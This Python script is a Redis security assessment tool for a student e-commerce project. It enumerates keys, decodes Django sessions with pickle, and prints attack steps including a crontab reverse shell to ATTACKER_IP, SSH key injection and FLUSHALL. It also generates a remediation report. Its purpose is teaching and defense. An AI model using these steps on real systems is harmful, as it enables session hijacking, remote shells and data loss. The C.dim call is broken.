#!/usr/bin/env python3
"""
=============================================================================
TrendMart — Redis Security Assessment Tool (Educational)
Author:       George Papasotiriou
Date Created: April 2026
Project:      TrendMart E-Commerce Platform — ITC-4214 Final Project

DISCLAIMER:
    This script is designed EXCLUSIVELY for educational and authorized
    security testing of YOUR OWN TrendMart deployment. It demonstrates
    the real-world impact of deploying Redis without authentication
    (requirepass). Running this against systems you do not own or have
    explicit written permission to test is ILLEGAL under the Computer
    Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and
    equivalent legislation worldwide.

PURPOSE:
    When Redis is deployed without a password (as in docker-compose.yml's
    redis service: `redis-server --maxmemory 128mb`), any network client
    can connect and perform FULL administrative operations. This script
    simulates a realistic attacker's workflow against an unauthenticated
    Redis instance backing a Django e-commerce site, demonstrating:

    1. Reconnaissance       — fingerprint the server, enumerate databases
    2. Data Exfiltration    — dump Django sessions, cache keys, rate limits
    3. Session Hijacking    — decode and steal active user sessions
    4. Cache Poisoning      — inject malicious cached data
    5. Rate Limit Bypass    — delete rate limiter keys to bypass protections
    6. Denial of Service    — mass key deletion, FLUSHALL
    7. Server Reconfiguration — change runtime settings via CONFIG SET
    8. Persistence Backdoor — write a crontab or SSH key via CONFIG dir/dbfilename

ARCHITECTURE CONTEXT (TrendMart):
    - Django cache backend: django_redis.cache.RedisCache
    - Key prefix: "tm" (KEY_PREFIX in settings.py)
    - Session engine: django.contrib.sessions.backends.cache
    - Rate limiter keys: ratelimit:<ip>:<path_prefix>
    - Collaborative filter cache: collab_recs_<product_id>
    - Redis URL format: redis://<host>:6379/0

USAGE:
    python redis_attack_demo.py --host <REDIS_HOST> --port 6379
    python redis_attack_demo.py --url redis://your-redis-host:6379/0

    To run against your local docker-compose setup:
    python redis_attack_demo.py --host localhost --port 6379

=============================================================================
"""

import argparse
import json
import sys
import time
import base64
import pickle
import zlib
from datetime import datetime
from urllib.parse import urlparse

try:
    import redis
except ImportError:
    print("\n[!] ERROR: 'redis' package not installed.")
    print("    Install it with: pip install redis")
    print("    This is the Redis client library, not the server.\n")
    sys.exit(1)


# ─── ANSI Colors for terminal output ─────────────────────────────────────────
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'

    @staticmethod
    def header(text):
        return f"\n{C.BOLD}{C.CYAN}{'='*70}\n  {text}\n{'='*70}{C.RESET}\n"

    @staticmethod
    def section(text):
        return f"\n{C.BOLD}{C.YELLOW}[*] {text}{C.RESET}"

    @staticmethod
    def success(text):
        return f"{C.GREEN}  [+] {text}{C.RESET}"

    @staticmethod
    def danger(text):
        return f"{C.RED}  [!] {text}{C.RESET}"

    @staticmethod
    def info(text):
        return f"{C.BLUE}  [i] {text}{C.RESET}"

    @staticmethod
    def warning(text):
        return f"{C.YELLOW}  [~] {text}{C.RESET}"

    @staticmethod
    def data(label, value):
        return f"{C.DIM}      {label}: {C.RESET}{C.WHITE}{value}{C.RESET}"


# ─── Report Generator ────────────────────────────────────────────────────────
class SecurityReport:
    """Collects findings and generates a structured security report."""

    def __init__(self):
        self.findings = []
        self.start_time = datetime.now()

    def add(self, severity, title, detail, recommendation=""):
        self.findings.append({
            'severity': severity,
            'title': title,
            'detail': detail,
            'recommendation': recommendation,
            'timestamp': datetime.now().isoformat(),
        })

    def generate(self, host, port):
        """Generate a markdown security report."""
        critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high     = [f for f in self.findings if f['severity'] == 'HIGH']
        medium   = [f for f in self.findings if f['severity'] == 'MEDIUM']
        low      = [f for f in self.findings if f['severity'] == 'LOW']
        info     = [f for f in self.findings if f['severity'] == 'INFO']

        report = f"""# Redis Security Assessment Report — TrendMart
**Date:** {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}
**Target:** {host}:{port}
**Duration:** {(datetime.now() - self.start_time).total_seconds():.1f} seconds

## Executive Summary
| Severity | Count |
|----------|-------|
| CRITICAL | {len(critical)} |
| HIGH     | {len(high)} |
| MEDIUM   | {len(medium)} |
| LOW      | {len(low)} |
| INFO     | {len(info)} |

## Findings
"""
        for i, finding in enumerate(self.findings, 1):
            sev = finding['severity']
            icon = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🔵', 'INFO': 'ℹ️'}.get(sev, '')
            report += f"""
### {i}. {icon} [{sev}] {finding['title']}
**Detail:** {finding['detail']}
"""
            if finding['recommendation']:
                report += f"**Recommendation:** {finding['recommendation']}\n"

        report += f"""
## Remediation Summary
1. **Set `requirepass`** in Redis configuration: `redis-server --requirepass <strong-password>`
2. **Update `REDIS_URL`** in Django settings: `redis://:password@host:6379/0`
3. **Bind to localhost only** if Redis is on the same server: `bind 127.0.0.1`
4. **Disable dangerous commands** via `rename-command`: `rename-command FLUSHALL ""`
5. **Use TLS** for Redis connections in production: `redis://:password@host:6380/0?ssl=true`
6. **Network isolation** — put Redis in a private subnet, not exposed to the internet
7. **Enable Redis ACLs** (Redis 6+) for fine-grained command control
"""
        return report


# ─── Attack Modules ──────────────────────────────────────────────────────────

def test_connection(r, report):
    """Phase 1: Test if Redis is accessible without authentication."""
    print(C.header("PHASE 1: RECONNAISSANCE — Connection & Server Fingerprinting"))

    # Test basic connectivity
    try:
        pong = r.ping()
        if pong:
            print(C.danger("Redis server responded to PING without authentication!"))
            report.add('CRITICAL', 'Unauthenticated Access',
                       'Redis server accepts connections without any password. '
                       'Any client on the network can read/write all data.',
                       'Set requirepass in redis.conf or use --requirepass flag.')
        else:
            print(C.info("PING returned unexpected response."))
            return False
    except redis.AuthenticationError:
        print(C.success("Redis requires authentication — this is CORRECT."))
        report.add('INFO', 'Authentication Required',
                   'Redis correctly requires a password for access.')
        return False
    except redis.ConnectionError as e:
        print(C.danger(f"Cannot connect to Redis: {e}"))
        return False

    # Server info fingerprinting
    print(C.section("Server Information (INFO command)"))
    try:
        info = r.info()
        server_details = {
            'Redis Version': info.get('redis_version', 'unknown'),
            'OS': info.get('os', 'unknown'),
            'Architecture': f"{info.get('arch_bits', '?')}-bit",
            'Process ID': info.get('process_id', '?'),
            'TCP Port': info.get('tcp_port', '?'),
            'Uptime (seconds)': info.get('uptime_in_seconds', '?'),
            'Uptime (days)': info.get('uptime_in_days', '?'),
            'Connected Clients': info.get('connected_clients', '?'),
            'Used Memory': info.get('used_memory_human', '?'),
            'Peak Memory': info.get('used_memory_peak_human', '?'),
            'Total Commands Processed': info.get('total_commands_processed', '?'),
            'Keyspace Hits': info.get('keyspace_hits', '?'),
            'Keyspace Misses': info.get('keyspace_misses', '?'),
            'Role': info.get('role', '?'),
        }

        for label, value in server_details.items():
            print(C.data(label, value))

        report.add('HIGH', 'Full Server Info Disclosure',
                    f"Redis {info.get('redis_version')} on {info.get('os')} — "
                    f"all server metadata exposed via INFO command including "
                    f"PID ({info.get('process_id')}), memory usage, and client count.",
                    'Rename or disable the INFO command for untrusted clients.')

        # Check if protected mode is disabled
        try:
            config_pm = r.config_get('protected-mode')
            pm_value = config_pm.get('protected-mode', 'unknown')
            if pm_value == 'no':
                print(C.danger(f"Protected-mode: {pm_value} (VULNERABLE)"))
                report.add('CRITICAL', 'Protected Mode Disabled',
                           'Redis protected-mode is set to "no", allowing '
                           'remote connections without authentication.',
                           'Set protected-mode yes or configure requirepass.')
            else:
                print(C.info(f"Protected-mode: {pm_value}"))
        except Exception:
            pass

    except Exception as e:
        print(C.warning(f"Could not retrieve server info: {e}"))

    return True


def enumerate_data(r, report):
    """Phase 2: Enumerate all keys and categorize them."""
    print(C.header("PHASE 2: DATA ENUMERATION — Key Discovery & Classification"))

    try:
        db_size = r.dbsize()
        print(C.danger(f"Total keys in database: {db_size}"))
        report.add('HIGH', 'Full Database Enumeration',
                   f'{db_size} keys are readable without authentication.',
                   'Require authentication before allowing KEYS/SCAN commands.')

        if db_size == 0:
            print(C.info("Database is empty — no keys to enumerate."))
            print(C.info("This means Redis is connected but Django hasn't cached anything yet."))
            print(C.info("Try browsing the website first (login, view products, use AI chat)"))
            print(C.info("to populate rate limit keys, session data, and cache entries."))
            return {}

        # Scan all keys (SCAN is safer than KEYS * for large databases)
        categories = {
            'sessions': [],        # Django session keys
            'rate_limits': [],     # Rate limiter keys
            'cache': [],           # General cache keys
            'collab_recs': [],     # Collaborative filtering recommendations
            'other': [],           # Unrecognized keys
        }

        cursor = 0
        all_keys = []
        while True:
            cursor, keys = r.scan(cursor, count=100)
            all_keys.extend(keys)
            if cursor == 0:
                break

        print(C.section(f"Classifying {len(all_keys)} keys..."))

        for key in all_keys:
            key_str = key.decode('utf-8', errors='replace') if isinstance(key, bytes) else key

            if 'session' in key_str.lower() or key_str.startswith(':1:django.contrib.sessions'):
                categories['sessions'].append(key_str)
            elif 'ratelimit' in key_str.lower():
                categories['rate_limits'].append(key_str)
            elif 'collab_recs' in key_str.lower():
                categories['collab_recs'].append(key_str)
            else:
                categories['cache'].append(key_str)

        for cat_name, keys in categories.items():
            if keys:
                icon = {'sessions': '🔐', 'rate_limits': '🚦', 'cache': '📦',
                        'collab_recs': '🤝', 'other': '❓'}.get(cat_name, '')
                print(f"\n  {icon} {cat_name.upper()}: {len(keys)} keys")
                for key in keys[:5]:  # Show first 5 keys per category
                    print(C.data("Key", key))
                if len(keys) > 5:
                    print(C.dim(f"      ... and {len(keys) - 5} more"))

        return categories

    except Exception as e:
        print(C.warning(f"Enumeration error: {e}"))
        return {}


def attack_sessions(r, report, categories):
    """Phase 3: Attempt to read, decode, and forge Django session data."""
    print(C.header("PHASE 3: SESSION HIJACKING — Reading Active User Sessions"))

    session_keys = categories.get('sessions', [])
    if not session_keys:
        print(C.info("No session keys found in Redis."))
        print(C.info("TIP: Sessions appear after a user logs in with REDIS_URL configured."))
        print(C.warning("Even without sessions, an attacker could INJECT a forged session."))
        report.add('MEDIUM', 'Session Injection Possible',
                   'Although no sessions were found, an attacker could create '
                   'fake session entries in Redis to impersonate any user, '
                   'including admin accounts.',
                   'Require Redis authentication to prevent session tampering.')
        return

    print(C.danger(f"Found {len(session_keys)} active sessions!"))
    report.add('CRITICAL', 'Session Data Exposed',
               f'{len(session_keys)} Django session(s) readable without authentication. '
               'An attacker can decode session data to extract user IDs, CSRF tokens, '
               'and 2FA bypass states, then inject the session cookie into their browser '
               'to impersonate any logged-in user.',
               'Set requirepass + use SESSION_ENGINE=db instead of cache in production.')

    for i, session_key in enumerate(session_keys[:3]):  # Analyze first 3
        print(C.section(f"Analyzing session {i+1}/{min(len(session_keys), 3)}"))
        print(C.data("Session Key", session_key))

        try:
            raw_data = r.get(session_key)
            if raw_data:
                print(C.data("Raw Size", f"{len(raw_data)} bytes"))

                # Try to decode Django session data
                # Django sessions in cache are typically pickled + base64
                decoded = None
                try:
                    # django-redis stores data with optional compression
                    if isinstance(raw_data, bytes):
                        try:
                            decompressed = zlib.decompress(raw_data)
                            decoded = pickle.loads(decompressed)
                        except (zlib.error, pickle.UnpicklingError):
                            try:
                                decoded = pickle.loads(raw_data)
                            except pickle.UnpicklingError:
                                try:
                                    text = raw_data.decode('utf-8')
                                    decoded = json.loads(text)
                                except (UnicodeDecodeError, json.JSONDecodeError):
                                    decoded = raw_data.hex()[:200] + '...'
                except Exception:
                    decoded = str(raw_data)[:200] + '...'

                if isinstance(decoded, dict):
                    print(C.danger("  Session data decoded successfully:"))
                    for sk, sv in decoded.items():
                        # Highlight sensitive fields
                        if any(s in str(sk).lower() for s in ['user', 'auth', 'csrf', '2fa', 'totp']):
                            print(C.danger(f"    {sk}: {sv}"))
                        else:
                            print(C.data(f"    {sk}", str(sv)[:100]))

                    # Check for user ID (session hijacking indicator)
                    user_id = decoded.get('_auth_user_id')
                    if user_id:
                        print(C.danger(f"\n  *** ACTIVE USER SESSION: User ID = {user_id} ***"))
                        print(C.danger(f"  *** An attacker can set this session cookie to impersonate this user ***"))
                        report.add('CRITICAL', f'Active Session Decoded — User ID {user_id}',
                                   f'Session for user_id={user_id} contains auth backend, '
                                   f'CSRF token hash, and potentially 2FA state. '
                                   f'Attacker can copy the session key to a cookie and '
                                   f'browse as this user without knowing their password.',
                                   'Enable Redis AUTH + rotate all sessions after fixing.')
                else:
                    print(C.data("Data (hex)", str(decoded)[:200]))

        except Exception as e:
            print(C.warning(f"  Could not read session: {e}"))


def attack_rate_limits(r, report, categories):
    """Phase 4: Bypass rate limiting by deleting rate limit keys."""
    print(C.header("PHASE 4: RATE LIMIT BYPASS — Disabling Brute-Force Protections"))

    rate_keys = categories.get('rate_limits', [])
    print(C.info(f"TrendMart rate limiter uses Redis keys with prefix 'ratelimit:'"))
    print(C.info(f"Format: ratelimit:<ip>:<endpoint> (e.g., ratelimit:1.2.3.4:/login/)"))

    if not rate_keys:
        print(C.warning("No active rate limit keys found."))
        print(C.danger("But an attacker can DELETE any rate limit key on demand:"))
        print(C.info("  DEL ratelimit:attacker_ip:/login/"))
        print(C.info("  → Instantly resets the login attempt counter"))
        print(C.info("  → Enables unlimited brute-force attempts against any account"))
    else:
        print(C.danger(f"Found {len(rate_keys)} active rate limit entries:"))
        for key in rate_keys[:10]:
            try:
                value = r.get(key)
                ttl = r.ttl(key)
                val_str = value.decode('utf-8', errors='replace') if isinstance(value, bytes) else str(value)
                print(C.data(key, f"count={val_str}, ttl={ttl}s"))
            except Exception:
                print(C.data(key, "(could not read)"))

    # Demonstrate the bypass (without actually doing it in dry-run)
    print(C.section("Attack Scenario: Brute-Force Login Bypass"))
    print(C.info("  1. Attacker tries 10 logins → gets rate-limited (429)"))
    print(C.info("  2. Attacker connects to Redis (no password needed)"))
    print(C.info("  3. Attacker runs: DEL ratelimit:<their_ip>:/login/"))
    print(C.info("  4. Rate limit counter resets → attacker tries 10 more"))
    print(C.info("  5. Repeat indefinitely → unlimited brute-force attempts"))
    print()
    print(C.danger("  IMPACT: The 10-per-minute login limit becomes USELESS."))
    print(C.danger("  IMPACT: The 5-per-minute registration limit is also bypassable."))
    print(C.danger("  IMPACT: The 30-per-minute AI chat limit → unlimited API abuse."))

    report.add('CRITICAL', 'Rate Limit Bypass via Key Deletion',
               'An attacker can delete their own rate limit keys from Redis, '
               'completely bypassing the RateLimitMiddleware. This enables '
               'unlimited brute-force login attempts, mass account registration, '
               'and unlimited AI API abuse (costing real money on OpenRouter).',
               'Require Redis authentication. Consider also implementing '
               'server-side rate limiting at the reverse proxy level (e.g., Nginx).')


def attack_cache_poisoning(r, report, categories):
    """Phase 5: Demonstrate cache poisoning attacks."""
    print(C.header("PHASE 5: CACHE POISONING — Injecting Malicious Cache Data"))

    print(C.section("Attack Vector 1: Collaborative Recommendation Poisoning"))
    print(C.info("  TrendMart caches product recommendations in Redis:"))
    print(C.info("  Key: collab_recs_<product_id>"))
    print(C.info("  Value: list of recommended product IDs"))
    print()
    print(C.danger("  Attack: SET collab_recs_42 '[999, 998, 997]'"))
    print(C.danger("  Effect: Product #42's 'Customers also bought' section"))
    print(C.danger("          now shows attacker-controlled products."))
    print(C.danger("  Impact: Drive traffic to specific products, manipulate sales."))

    report.add('HIGH', 'Cache Poisoning — Recommendation Manipulation',
               'An attacker can overwrite collaborative filtering cache keys '
               '(collab_recs_*) to redirect product recommendations to any '
               'product, enabling sales manipulation and competitive sabotage.',
               'Require Redis authentication. Validate cache data on read.')

    print(C.section("Attack Vector 2: Arbitrary Cache Injection"))
    print(C.info("  Django's cache framework stores arbitrary Python objects."))
    print(C.info("  An attacker can inject crafted cache entries that Django"))
    print(C.info("  will deserialize and trust as legitimate cached data."))
    print()
    print(C.danger("  Attack: SET tm:views:some_view <pickled malicious data>"))
    print(C.danger("  Effect: Next request to that view returns attacker-controlled content."))

    report.add('HIGH', 'Arbitrary Cache Injection',
               'An attacker can write any key/value to the Django cache backend. '
               'If the application caches rendered views or query results, '
               'the attacker can serve fake content to all users.',
               'Use Redis AUTH. Avoid caching security-sensitive data without validation.')


def attack_dos(r, report):
    """Phase 6: Demonstrate Denial of Service capabilities."""
    print(C.header("PHASE 6: DENIAL OF SERVICE — Destructive Operations"))

    print(C.section("Available destructive commands (NOT executed):"))

    attacks = [
        ("FLUSHALL", "Deletes ALL data across ALL Redis databases",
         "Complete data loss — all sessions, cache, rate limits gone instantly"),
        ("FLUSHDB", "Deletes all keys in the current database",
         "Current database wiped — all active sessions invalidated"),
        ("DEBUG SLEEP 999", "Blocks the Redis server for 999 seconds",
         "All Django workers hang waiting for Redis — site goes down"),
        ("CONFIG SET maxmemory 1mb", "Reduces max memory to 1MB",
         "Redis starts evicting all keys — cache/sessions stop working"),
        ("CLIENT KILL", "Disconnects specific clients",
         "Can disconnect Django workers from Redis selectively"),
        ("SHUTDOWN NOSAVE", "Shuts down the Redis server immediately",
         "Redis process terminates — all features depending on Redis fail"),
    ]

    for cmd, desc, impact in attacks:
        print(f"\n  {C.RED}{C.BOLD}Command:{C.RESET} {C.WHITE}{cmd}{C.RESET}")
        print(f"  {C.DIM}Action:{C.RESET}  {desc}")
        print(f"  {C.RED}Impact:{C.RESET}  {impact}")

    report.add('CRITICAL', 'Full Destructive Control',
               'An attacker can execute FLUSHALL (wipe all data), '
               'SHUTDOWN (kill the server), DEBUG SLEEP (hang the server), '
               'or CONFIG SET (cripple performance). Any of these would '
               'cause immediate service disruption.',
               'Set requirepass. Use rename-command to disable dangerous commands: '
               'rename-command FLUSHALL "" and rename-command SHUTDOWN "".')


def attack_config(r, report):
    """Phase 7: Demonstrate server reconfiguration attacks."""
    print(C.header("PHASE 7: SERVER RECONFIGURATION — CONFIG Command Abuse"))

    print(C.section("Reading server configuration (CONFIG GET *)"))
    try:
        # Get all configuration parameters
        config = r.config_get('*')
        sensitive_params = [
            'requirepass', 'masterauth', 'bind', 'port', 'dir',
            'dbfilename', 'logfile', 'protected-mode', 'maxmemory',
            'save', 'rename-command',
        ]

        print(C.danger(f"  Server exposes {len(config)} configuration parameters!"))
        print()

        for param in sensitive_params:
            if param in config:
                value = config[param]
                is_dangerous = (
                    (param == 'requirepass' and not value) or
                    (param == 'protected-mode' and value == 'no') or
                    (param == 'bind' and ('0.0.0.0' in str(value) or not value))
                )
                if is_dangerous:
                    print(C.danger(f"  {param} = {value or '(empty)'} *** VULNERABLE ***"))
                else:
                    print(C.data(param, value or '(empty)'))

        # Check for the classic RCE via CONFIG SET dir/dbfilename
        print(C.section("Persistence Backdoor via CONFIG SET (NOT executed)"))
        print(C.info("  Classic attack: write a crontab entry or SSH key via Redis"))
        print()
        print(C.danger("  Step 1: CONFIG SET dir /var/spool/cron/crontabs"))
        print(C.danger('  Step 2: CONFIG SET dbfilename root'))
        print(C.danger('  Step 3: SET payload "\\n* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\n"'))
        print(C.danger('  Step 4: BGSAVE'))
        print(C.danger("  Result: Reverse shell to attacker's server every minute!"))
        print()
        print(C.info("  OR for SSH key injection:"))
        print(C.danger("  Step 1: CONFIG SET dir /root/.ssh"))
        print(C.danger('  Step 2: CONFIG SET dbfilename authorized_keys'))
        print(C.danger('  Step 3: SET key "\\n\\nssh-rsa ATTACKER_PUBLIC_KEY_HERE\\n\\n"'))
        print(C.danger('  Step 4: BGSAVE'))
        print(C.danger("  Result: Attacker has SSH access to the server as root!"))

        report.add('CRITICAL', 'Remote Code Execution via CONFIG SET',
                   'The CONFIG SET command is available, allowing an attacker to '
                   'change the database dump directory (dir) and filename (dbfilename) '
                   'to write arbitrary files to the filesystem. This enables: '
                   '(1) crontab injection for reverse shells, '
                   '(2) SSH key injection for persistent access, '
                   '(3) webshell placement in web-accessible directories.',
                   'Set requirepass. Disable CONFIG with: rename-command CONFIG "".')

    except redis.ResponseError as e:
        if 'NOAUTH' in str(e):
            print(C.success("CONFIG command requires authentication — good!"))
        else:
            print(C.warning(f"CONFIG command failed: {e}"))
    except Exception as e:
        print(C.warning(f"Could not read config: {e}"))


def demonstrate_live_attack(r, report):
    """Phase 8: Perform safe, non-destructive LIVE demonstrations."""
    print(C.header("PHASE 8: LIVE DEMONSTRATION — Safe Non-Destructive Proof"))

    # 8a: Write and read a proof-of-concept key
    print(C.section("Test 8a: Write a proof-of-concept key"))
    poc_key = "tm:security_test:poc_by_attacker"
    poc_value = json.dumps({
        "message": "This key was written by an unauthenticated attacker",
        "timestamp": datetime.now().isoformat(),
        "severity": "CRITICAL",
        "tool": "TrendMart Redis Security Assessment",
    })
    try:
        r.set(poc_key, poc_value, ex=300)  # Auto-expires in 5 minutes
        readback = r.get(poc_key)
        if readback:
            print(C.danger(f"  Successfully wrote AND read back a key!"))
            print(C.data("Key", poc_key))
            print(C.data("Value", readback.decode('utf-8', errors='replace')[:200]))
            print(C.data("TTL", "300 seconds (auto-cleanup)"))
            report.add('CRITICAL', 'Unauthenticated Write Confirmed',
                       f'Successfully wrote key "{poc_key}" to Redis without '
                       f'any authentication. This proves full read/write access.',
                       'Set requirepass immediately.')
        # Clean up
        r.delete(poc_key)
        print(C.success("  Cleaned up proof-of-concept key."))
    except Exception as e:
        print(C.warning(f"  Could not write PoC key: {e}"))

    # 8b: Check keyspace notifications (if enabled, attacker can monitor all operations)
    print(C.section("Test 8b: Keyspace Notification Monitoring"))
    try:
        notify_config = r.config_get('notify-keyspace-events')
        notify_val = notify_config.get('notify-keyspace-events', '')
        if notify_val:
            print(C.danger(f"  Keyspace notifications enabled: '{notify_val}'"))
            print(C.danger("  An attacker can SUBSCRIBE to monitor ALL key changes in real-time!"))
            report.add('HIGH', 'Keyspace Notifications Enabled',
                       'An attacker can subscribe to keyspace notifications to '
                       'monitor every key change in real-time, including session '
                       'creation (user logins) and cache updates.',
                       'Disable keyspace notifications if not needed.')
        else:
            print(C.info("  Keyspace notifications are disabled (good)."))
    except Exception:
        pass

    # 8c: Check SLOWLOG for recent slow commands
    print(C.section("Test 8c: Slow Query Log (SLOWLOG)"))
    try:
        slowlog = r.slowlog_get(5)
        if slowlog:
            print(C.danger(f"  {len(slowlog)} slow commands found in the log:"))
            for entry in slowlog[:3]:
                cmd = ' '.join(
                    a.decode('utf-8', errors='replace') if isinstance(a, bytes) else str(a)
                    for a in entry.get('command', [b'unknown'])
                )
                duration = entry.get('duration', 0)
                print(C.data("Command", f"{cmd} ({duration}μs)"))
            report.add('MEDIUM', 'Slow Query Log Accessible',
                       'SLOWLOG reveals recent command patterns and can leak '
                       'key names, values, and access patterns.',
                       'Disable SLOWLOG access or require authentication.')
        else:
            print(C.info("  No slow queries recorded."))
    except Exception:
        pass

    # 8d: Check CLIENT LIST for connected clients
    print(C.section("Test 8d: Connected Clients (CLIENT LIST)"))
    try:
        clients = r.client_list()
        print(C.danger(f"  {len(clients)} client(s) connected:"))
        for client in clients[:5]:
            addr = client.get('addr', 'unknown')
            name = client.get('name', '(unnamed)')
            cmd  = client.get('cmd', 'unknown')
            db   = client.get('db', '?')
            age  = client.get('age', '?')
            print(C.data(f"Client {addr}", f"name={name}, cmd={cmd}, db={db}, age={age}s"))

        report.add('HIGH', 'Client List Exposed',
                   f'{len(clients)} connected clients visible. Attacker can see '
                   f'all connected Django workers (IP addresses and commands), '
                   f'and even disconnect them with CLIENT KILL.',
                   'Require authentication. Use rename-command CLIENT "".')
    except Exception:
        pass


# ─── Main Execution ──────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='TrendMart Redis Security Assessment Tool (Educational)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --host localhost --port 6379
  %(prog)s --url redis://your-redis-host:6379/0
  %(prog)s --host localhost --port 6379 --report report.md

DISCLAIMER: For authorized testing only. Never target systems you do not own.
        """
    )
    parser.add_argument('--host', default='localhost', help='Redis hostname (default: localhost)')
    parser.add_argument('--port', type=int, default=6379, help='Redis port (default: 6379)')
    parser.add_argument('--url', help='Redis URL (e.g., redis://host:6379/0)')
    parser.add_argument('--db', type=int, default=0, help='Redis database number (default: 0)')
    parser.add_argument('--report', default='redis_security_report.md',
                        help='Output file for the security report (default: redis_security_report.md)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds')

    args = parser.parse_args()

    # Parse URL if provided
    host = args.host
    port = args.port
    db = args.db
    if args.url:
        parsed = urlparse(args.url)
        host = parsed.hostname or 'localhost'
        port = parsed.port or 6379
        db = int(parsed.path.lstrip('/') or 0)

    # Banner
    print(f"""
{C.RED}{C.BOLD}
 ██████╗░███████╗██████╗░██╗░██████╗  ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
 ██╔══██╗██╔════╝██╔══██╗██║██╔════╝  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
 ██████╔╝█████╗░░██║░░██║██║╚█████╗░  ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
 ██╔══██╗██╔══╝░░██║░░██║██║░╚═══██╗  ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
 ██║░░██║███████╗██████╔╝██║██████╔╝  ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
 ╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝╚═════╝░  ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
{C.RESET}
{C.CYAN}  TrendMart Redis Security Assessment Tool — Educational Use Only{C.RESET}
{C.DIM}  ITC-4214 Internet Programming Level 6 — Security Testing Module{C.RESET}

{C.YELLOW}  Target: {host}:{port} (DB {db}){C.RESET}
{C.DIM}  Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}
{C.RED}  ⚠  AUTHORIZED TESTING ONLY — DO NOT USE ON SYSTEMS YOU DO NOT OWN{C.RESET}
""")

    # Connect to Redis
    print(C.section(f"Connecting to Redis at {host}:{port}..."))
    try:
        r = redis.Redis(
            host=host,
            port=port,
            db=db,
            socket_timeout=args.timeout,
            socket_connect_timeout=args.timeout,
            decode_responses=False,  # Keep raw bytes for session analysis
        )
    except Exception as e:
        print(C.danger(f"Failed to create Redis client: {e}"))
        sys.exit(1)

    report = SecurityReport()

    # ── Execute attack phases ──────────────────────────────────────────────────
    connected = test_connection(r, report)
    if not connected:
        print(C.header("ASSESSMENT COMPLETE — Redis is protected or unreachable"))
        print(C.success("No vulnerabilities found (Redis requires authentication)."))
        return

    categories = enumerate_data(r, report)
    attack_sessions(r, report, categories)
    attack_rate_limits(r, report, categories)
    attack_cache_poisoning(r, report, categories)
    attack_dos(r, report)
    attack_config(r, report)
    demonstrate_live_attack(r, report)

    # ── Generate report ──────────────────────────────────────────────────────
    print(C.header("ASSESSMENT COMPLETE — Generating Security Report"))

    report_content = report.generate(host, port)

    report_path = args.report
    try:
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(report_content)
        print(C.success(f"Report saved to: {report_path}"))
    except Exception as e:
        print(C.warning(f"Could not save report: {e}"))
        print(C.info("Report content:"))
        print(report_content)

    # Summary
    critical = len([f for f in report.findings if f['severity'] == 'CRITICAL'])
    high = len([f for f in report.findings if f['severity'] == 'HIGH'])
    print(f"""
{C.RED}{C.BOLD}  ╔══════════════════════════════════════════════════════════════╗
  ║  FINDINGS SUMMARY                                          ║
  ║  ─────────────────                                         ║
  ║  CRITICAL: {critical:<3}  HIGH: {high:<3}                                  ║
  ║                                                            ║
  ║  ROOT CAUSE: Redis deployed with no password               ║
  ║  (redis-server --maxmemory 128mb in docker-compose.yml)    ║
  ║                                                            ║
  ║  FIX: Add --requirepass <password> to the Redis command     ║
  ║  and update REDIS_URL in Django settings accordingly.       ║
  ╚══════════════════════════════════════════════════════════════╝{C.RESET}
""")

    r.close()


if __name__ == '__main__':
    main()
